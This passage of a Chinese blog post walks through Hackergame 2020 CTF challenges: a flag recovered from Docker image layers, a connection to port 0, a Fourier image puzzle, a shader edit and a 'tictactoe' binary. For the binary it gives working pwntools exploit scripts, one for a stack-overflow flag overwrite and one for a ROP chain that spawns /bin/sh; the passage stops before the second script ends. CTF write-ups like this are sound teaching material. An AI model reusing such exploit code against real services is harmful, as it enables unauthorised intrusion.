<li>Docker Hub 地址：<a target="_blank" rel="noopener" href="https://hub.docker.com/r/8b8d3c8324c7/stringtool">8b8d3c8324c7/stringtool</a></li>
</ul>
</blockquote>
<p>首先把镜像拉下来</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker pull 8b8d3c8324c7/stringtool</code></pre>
<p>在 <a target="_blank" rel="noopener" href="https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore">Image Layers</a> 里可以看到删除 <code>flag.txt</code> 的层。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101000901233.png" alt="Image Layers"></p>
<p>或者</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker <span class="token function">history</span> 8b8d3c8324c7/stringtool</code></pre>
<p>那么我们就找一找构建过程中的文件好了。</p>
<p>把镜像导出来。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker save 8b8d3c8324c7/stringtool <span class="token operator">&gt;</span> images.tar</code></pre>
<blockquote>
<p>BTW, <code>docker save</code> 用来将一个或多个 <strong>image</strong> 打包保存，而 <code>docker export</code> 用来将 <strong>container</strong> 的文件系统进行打包。</p>
<p><code>docker load</code> 用来载入镜像包，<code>docker import</code> 用来载入容器包，但两者都会恢复为镜像；</p>
<p><code>docker load</code> 不能对载入的镜像重命名，而 <code>docker import</code> 可以为镜像指定新名称。</p>
<p>（参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/liukuan73/article/details/78089138">docker save与docker export的区别</a>）</p>
</blockquote>
<p>在里面找到了。<em>（话说有没有快一点的方法唉</em></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101001523820.png" alt="images"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101001540120.png" alt="flag">    </p>
<p><code>flag{Docker_Layers!=PS_Layers_hhh}</code></p>
<p>顺便看了一眼 Dockerfile。</p>
<pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile"># Set the base image to use to centos 7
FROM centos:7

# Set the file maintainer
MAINTAINER Software_Engineering_Project

# Install necessary tools
RUN yum -y install wget make yum-utils

# Install python dependencies
RUN yum-builddep python -y

# Install tools needed
RUN yum -y install gcc
RUN yum -y install vim
RUN yum -y install mariadb-devel

# Download the python3.7.3
RUN wget -O /tmp/Python-3.7.3.tgz https://www.python.org/ftp/python/3.7.3/Python-3.7.3.tgz

# Build and install python3.7.3
RUN tar -zxvf /tmp/Python-3.7.3.tgz -C /tmp/
RUN /tmp/Python-3.7.3/configure
RUN make &amp;&amp; make install

# Create symbolic link
RUN rm -f /usr/bin/python
RUN ln -s /usr/local/bin/python3 /usr/bin/python
RUN ln -s /usr/local/bin/pip3 /usr/bin/pip

# Upgrade the pip
RUN pip install --upgrade pip

# Fix the yum
RUN sed -i 's/python/python2/' /usr/bin/yum

# Clean
RUN rm -rf /tmp/Python-3.7.3*
RUN yum clean all

RUN pip3 install ipython
RUN pip3 install bpython
RUN pip3 install pipenv

ENV PYTHONUNBUFFERED 1
RUN mkdir /code
WORKDIR /code
COPY . /code/
RUN rm /code/flag.txt
ENTRYPOINT python /code/app.py</code></pre>
<p>每一次 RUN 都是新开一个容器执行相应的操作，在当前镜像基础上执行指定命令，并提交为新的镜像。</p>
<p>某种程度上可以说镜像是一个分层的文件系统。Docker 镜像实际上就是由这样的一层层文件进行叠加起来的，上层的文件会覆盖下层的同名文件。而各层里有重复的文件，因此镜像要大得多。这些层合并在一起就成了容器里的内容。</p>
<p>也正是如此，flag 也能够被找到了23333.</p>
<hr>
<h2 id="从零开始的-HTTP-链接"><a href="#从零开始的-HTTP-链接" class="headerlink" title="从零开始的 HTTP 链接"></a>从零开始的 HTTP 链接</h2><blockquote>
<p>众所周知，数组下标应当从 0 开始。</p>
<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>
<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>
<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>
<p><a target="_blank" rel="noopener" href="http://202.38.93.111:0/">http://202.38.93.111:0/</a></p>
</blockquote>
<p>这个真的有意思。一般 TCP 端口都是1-65535，于是很多客户端都不支持 0 号端口。</p>
<p>好在部分版本的 curl 以及 wget 支持。</p>
<p>然而我在本地跑还连不上这个端口，怕是被运营商掐断了？</p>
<p>在VPS上试试，发现可行。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://202.38.93.111:0
<span class="token comment"># 或者 </span>
<span class="token comment"># wget http://202.38.93.111:0</span></code></pre>
<p>得到一个网页，发现是一个 xterm 终端，和其他题目的在线终端一样的。</p>
<pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Terminal<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/js/xterm/css/xterm.css<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/js/xterm/lib/xterm.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/js/xterm-addon-attach/lib/xterm-addon-attach.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/js/xterm-addon-fit/lib/xterm-addon-fit.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
      <span class="token selector">#terminal</span> <span class="token punctuation">{</span>
        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
        <span class="token property">top</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
        <span class="token property">right</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
        <span class="token property">bottom</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
        <span class="token property">left</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>terminal<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
      <span class="token keyword">const</span> term <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Terminal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> fitAddon <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FitAddon<span class="token punctuation">.</span>FitAddon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      term<span class="token punctuation">.</span><span class="token function">loadAddon</span><span class="token punctuation">(</span>fitAddon<span class="token punctuation">)</span><span class="token punctuation">;</span>
      term<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"terminal"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      fitAddon<span class="token punctuation">.</span><span class="token function">fit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'resize'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        fitAddon<span class="token punctuation">.</span><span class="token function">fit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> firstmsg <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span>
        location<span class="token punctuation">.</span>origin<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^http</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token string">"ws"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/shell"</span>
      <span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> attachAddon <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AttachAddon<span class="token punctuation">.</span>AttachAddon</span><span class="token punctuation">(</span>socket<span class="token punctuation">)</span><span class="token punctuation">;</span>
      term<span class="token punctuation">.</span><span class="token function">loadAddon</span><span class="token punctuation">(</span>attachAddon<span class="token punctuation">)</span><span class="token punctuation">;</span>
      socket<span class="token punctuation">.</span><span class="token function-variable function">onclose</span> <span class="token operator">=</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        term<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"\nConnection closed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">;</span>
      socket<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>firstmsg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          firstmsg <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> token <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          window<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">replaceState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            token <span class="token operator">=</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">)</span> socket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>token <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">;</span>
      term<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre>
<p>这个逻辑是访问网页后实例化一个 WebSocket，将 HTTP 升级到 WS 协议，URI 为 ws://202.38.93.111:0/shell</p>
<p>于是乎就去找 websocket 客户端来实现。</p>
<p>最开始想用 pwntools，发现能作为 socket 连上但还模仿不了 ws<em>（可能没领悟到</em>。</p>
<p>之后找到了 GitHub 上的 **<a target="_blank" rel="noopener" href="https://github.com/websocket-client/websocket-client">websocket-client</a>**，这是一个 Python 的 ws 库，本来想直接用他现成的 <code>wsdump.py</code>，发现连不上。。</p>
<p>最后又找了个编译好的客户端，**<a target="_blank" rel="noopener" href="https://github.com/vi/websocat">websocat</a>**，按照安装说明进行安装，再连接服务器就完事了。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101162810752.png" alt="flag"></p>
<hr>
<h2 id="来自一教的图片"><a href="#来自一教的图片" class="headerlink" title="来自一教的图片"></a>来自一教的图片</h2><blockquote>
<p>小 P 在一教做<strong>傅里叶光学</strong>实验时，在实验室电脑的模拟程序里发现了这么一张的图片：</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/4f_system_middle.bmp" alt="img"></p>
<p>数理基础并不扎实的小 P 并不知道什么东西成像会是这个样子：又或许什么东西都不是，毕竟这只是模拟 … 但可以确定的是，这些看似奇怪的花纹里确实隐藏着一些信息，或许是地下金矿的藏宝图也未可知。</p>
</blockquote>
<p>根据提示应该与 傅里叶变换 有关。</p>
<p>给图片做个 FFT 处理，就得到 flag 了。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/fourier.png" alt="fourier"></p>
<p>拼一下就能得到</p>
<p><code>flag{Fxurier_xptics_is_fun}</code></p>
<p>噢 Fourier optics 的确是傅里叶光学，嘻嘻嘻。</p>
<hr>
<h2 id="超简陋的-OpenGL-小程序"><a href="#超简陋的-OpenGL-小程序" class="headerlink" title="超简陋的 OpenGL 小程序"></a>超简陋的 OpenGL 小程序</h2><p>啥也不懂，魔改就是了。</p>
<p>把文件删了点东西，他出来这样的。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102203227613.png"></p>
<p>不对劲，查了一下这个好像是 OpenGL着色器语言(GLSL)。</p>
<p>有机会可以看看 <a target="_blank" rel="noopener" href="https://learnopengl-cn.readthedocs.io/zh/latest/01%20Getting%20started/05%20Shaders/">OpenGL 入门文档</a>。</p>
<p>最后魔改了 <code>basic_lighting.vs</code> 这个文件。看不清楚就改改偏移就好了。</p>
<pre class="language-none"><code class="language-none">void main()
{
    FragPos = vec3(projection * vec4(aPos-0.45, 1.0));
    Normal = aNormal;  
    
    gl_Position = projection * view * vec4(FragPos, 1.0);
}</code></pre>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102230459235.png" alt="flag"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102230203413.png" alt="flag"></p>
<p><code>flag{glGraphicsHappy(233);}</code></p>
<hr>
<h2 id="生活在博弈树上"><a href="#生活在博弈树上" class="headerlink" title="生活在博弈树上"></a>生活在博弈树上</h2><h3 id="始终热爱大地"><a href="#始终热爱大地" class="headerlink" title="始终热爱大地"></a>始终热爱大地</h3><p>是个最基本的<strong>栈溢出</strong>。</p>
<p><code>gets(input);</code>函数存在漏洞，看一下栈上情况。</p>
<p><code>input</code> 对应 <code>v14</code>，<code>success</code> 对应 <code>v17</code></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103231134749.png"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103231221608.png" alt="stack"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103231201409.png" alt="stack"></p>
<p>偏移为 -0x01-(-0x90) = 0x8F</p>
<p>bool 库里的 <code>true</code> 为 0x01。</p>
<p>把这个 <code>success</code> 覆盖为 0x01 就能出 flag 了。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
<span class="token comment"># coding: utf-8</span>
<span class="token triple-quoted-string string">"""
Hackergame_tictactoe
@Author: MiaoTony
@Time: 20201103
"""</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
token <span class="token operator">=</span> <span class="token string">'xxxxxxxxxxxxxxxxxxx'</span>
sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"202.38.93.111"</span><span class="token punctuation">,</span> <span class="token number">10141</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please input your token: '</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b'1'</span> <span class="token operator">*</span> <span class="token number">0x8F</span>
payload <span class="token operator">+=</span> <span class="token string">b'\x01'</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'such as (0,1): '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103230743129.png" alt="flag"></p>
<p><code>flag{easy_gamE_but_can_u_get_my_shel1}</code></p>
<h3 id="升上天空"><a href="#升上天空" class="headerlink" title="升上天空"></a>升上天空</h3><p>要拿 shell 啊。。</p>
<p>先用 ROPgadget 生成 ROP Chain.</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ROPgadget --binary tictactoe --ropchain</code></pre>
<p>然后把这个放到返回值的位置打过去就完事了。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
<span class="token comment"># coding: utf-8</span>
<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> context<span class="token punctuation">,</span> remote

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
token <span class="token operator">=</span> <span class="token string">'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'</span>
sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"202.38.93.111"</span><span class="token punctuation">,</span> <span class="token number">10141</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please input your token: '</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b'1'</span> <span class="token operator">*</span> <span class="token number">0x8F</span>
payload <span class="token operator">+=</span> <span class="token string">b'\x01'</span>
payload <span class="token operator">+=</span> <span class="token string">b'1'</span> <span class="token operator">*</span> <span class="token number">8</span>

<span class="token comment"># Padding goes here</span>
p <span class="token operator">=</span> <span class="token string">b''</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000407228</span><span class="token punctuation">)</span>  <span class="token comment"># pop rsi ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004a60e0</span><span class="token punctuation">)</span>  <span class="token comment"># @ .data</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000043e52c</span><span class="token punctuation">)</span>  <span class="token comment"># pop rax ; ret</span>
p <span class="token operator">+=</span> <span class="token string">b'/bin//sh'</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000046d7b1</span><span class="token punctuation">)</span>  <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000407228</span><span class="token punctuation">)</span>  <span class="token comment"># pop rsi ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004a60e8</span><span class="token punctuation">)</span>  <span class="token comment"># @ .data + 8</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000439070</span><span class="token punctuation">)</span>  <span class="token comment"># xor rax, rax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000046d7b1</span><span class="token punctuation">)</span>  <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004017b6</span><span class="token punctuation">)</span>  <span class="token comment"># pop rdi ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004a60e0</span><span class="token punctuation">)</span>  <span class="token comment"># @ .data</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000407228</span><span class="token punctuation">)</span>  <span class="token comment"># pop rsi ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004a60e8</span><span class="token punctuation">)</span>  <span class="token comment"># @ .data + 8</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000043dbb5</span><span class="token punctuation">)</span>  <span class="token comment"># pop rdx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004a60e8</span><span class="token punctuation">)</span>  <span class="token comment"># @ .data + 8</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000439070</span><span class="token punctuation">)</span>  <span class="token comment"># xor rax, rax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>
